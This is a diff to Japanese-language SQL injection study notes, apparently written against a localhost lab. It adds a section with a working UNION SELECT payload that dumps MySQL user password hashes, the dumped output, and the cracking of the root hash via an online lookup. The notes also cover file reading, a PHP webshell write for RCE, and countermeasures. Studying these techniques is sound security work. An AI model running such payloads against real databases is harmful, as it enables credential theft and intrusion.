@@ -10,7 +10,7 @@
 - [LOAD_FILE - Read file](#load_file-read-file)
   - [前提条件](#前提条件)
   - [手順](#手順)
-    - [Step 1: LOAD_FILEでファイルを読み出す](#step-1-LOAD_FILEでファイルを読み出す)
+    - [Step 1: LOAD_FILEでファイルを読み出す](#step-1-load_fileでファイルを読み出す)
   - [対策](#対策)
 - [INTO OUTFILE - Write a PHP file to RCE](#into-outfile-write-a-php-file-to-rce)
   - [前提条件](#前提条件-1)
@@ -214,3 +214,32 @@ PWNED!
 - 複文実行を禁止するオプションを有効化するか、sqliなどを使用する
 - MySQLプロセスの権限を必要最小限に絞る
 - secure-file-privオプションを有効化してファイル書き込みを禁止する
+
+
+## mysql.user - Crack Credentials
+
+### 手順
+
+#### Step 1: パスワードハッシュを取得する
+
+```
+http://localhost:8888/mysql.php?user=&pass=' UNION SELECT NULL, user, authentication_string FROM mysql.user;--+
+```
+
+> result:
+>
+> id=, username=root, password=*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
+> id=, username=mysql.session, password=*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+> id=, username=mysql.sys, password=*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+> id=, username=mysql, password=*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
+
+
+#### Step 2: パスワードを復元する
+
+https://crackstation.net/
+
+|Hash|Type|Result|
+| - | - | - |
+|2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19|MySQL4.1+|password|
+
+
